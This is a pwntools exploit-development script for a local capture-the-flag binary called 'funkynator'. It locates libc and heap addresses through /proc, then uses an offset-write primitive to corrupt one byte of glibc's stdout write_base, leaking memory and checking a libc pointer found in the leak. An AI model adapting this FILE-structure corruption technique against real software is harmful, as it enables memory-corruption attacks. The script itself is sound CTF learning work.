#!/usr/bin/env python3
"""Simplest possible test - just print raw output after overwrite."""
from pwn import *
import struct, time
from pathlib import Path

context.arch = 'amd64'
context.log_level = 'info'

CHALLENGE_DIR = Path(__file__).parent / 'challenge' / 'challenge'
BINARY = str(CHALLENGE_DIR.resolve() / 'funkynator')

env = {'LD_LIBRARY_PATH': str(CHALLENGE_DIR.resolve() / 'glibc')}

r = process(BINARY, env=env, cwd=str(CHALLENGE_DIR))

r.recvuntil(b'name?')
r.sendline(b'TEST')
r.recvuntil(b'> ')

# Create msg1+2
for _ in range(2):
    r.sendline(b'2')
    r.recvuntil(b'length')
    r.recvline()
    r.sendline(b'5' if _ == 0 else b'10')
    r.recvuntil(b'message:')
    r.sendline(b'AAAAA' if _ == 0 else b'BBBBBBBBBB')
    r.recvuntil(b'?')
    r.sendline(b'n')
    r.recvuntil(b'?')
    r.sendline(b'y')
    r.recvuntil(b'location')
    r.recvline()
    r.recvuntil(b'> ')

# Get addresses
pid = r.pid
with open(f'/proc/{pid}/maps') as f:
    maps = f.read()
binary_base = libc_base = None
for l in maps.split('\n'):
    p = l.strip().split()
    if len(p) < 5: continue
    if 'funkynator' in p[-1] and p[1] == 'r--p' and p[2] == '00000000':
        binary_base = int(p[0].split('-')[0], 16)
    if 'libc.so.6' in p[-1] and p[1] == 'r--p' and p[2] == '00000000':
        libc_base = int(p[0].split('-')[0], 16)
        break

with open(f'/proc/{pid}/mem', 'rb') as f:
    f.seek(binary_base + 0x4060)
    arr = f.read(16)
    msg2 = struct.unpack('<Q', arr[8:16])[0]

STDOUT = 0x1e85c0; WB_OFF = 0x20
with open(f'/proc/{pid}/mem', 'rb') as f:
    f.seek(libc_base + STDOUT + WB_OFF)
    orig_wb = struct.unpack('<Q', f.read(8))[0]

orig_byte1 = (orig_wb >> 8) & 0xFF
new_byte1 = (orig_byte1 - 2) & 0xFF
off = ((libc_base + STDOUT + WB_OFF + 1) - msg2) & 0xFFFFFFFFFFFFFFFF

log.info(f"libc={libc_base:#x} msg2={msg2:#x}")
log.info(f"byte1: {orig_byte1:#04x}->{new_byte1:#04x} off={off:#x}")

# Enter editor
r.sendline(b'5')
r.recvuntil(b'id')
r.recvline()
r.sendline(b'2')
r.recvuntil(b'> ')

# Overwrite byte 1 of stdout write_base
r.sendline(b'3')
r.recvuntil(b'offset')
r.recvline()
r.sendline(str(off).encode())
r.recvuntil(b'with what')
r.recvline()
r.send(bytes([new_byte1]) + b'\n')

# Now instead of recvuntil, just raw recv with timeout
log.info("Reading raw output after overwrite...")

# First try to see if any data comes at all
time.sleep(1)
try:
    data = r.recv(timeout=3)
    log.info(f"Got {len(data)} raw bytes")
    if data:
        log.info(f"Hex dump (first 300): {data[:300].hex()}")
        log.info(f"Looking for _IO_list_all at expected offset...")
        
        new_wb = (orig_wb & 0xFFFFFFFFFFFF00FF) | (new_byte1 << 8)
        list_all_off = (libc_base + 0x1e84c0) - new_wb
        log.info(f"new_wb={new_wb:#x} list_all_off={list_all_off:#x}")
        
        if len(data) >= list_all_off + 8:
            leaked = struct.unpack('<Q', data[list_all_off:list_all_off+8])[0]
            log.info(f"Leaked at offset {list_all_off}: {leaked:#x}")
            computed = leaked - 0x1e84e0
            if abs(computed - libc_base) < 0x2000:
                log.success(f"Leak verified! libc={computed:#x} actual={libc_base:#x}")
        else:
            log.warning(f"Only {len(data)} bytes, need {list_all_off + 8}")
            # Check if the data has any recognizable patterns
            log.info(f"Raw data: {data}")
except EOFError:
    log.error("Process died!")

r.close()
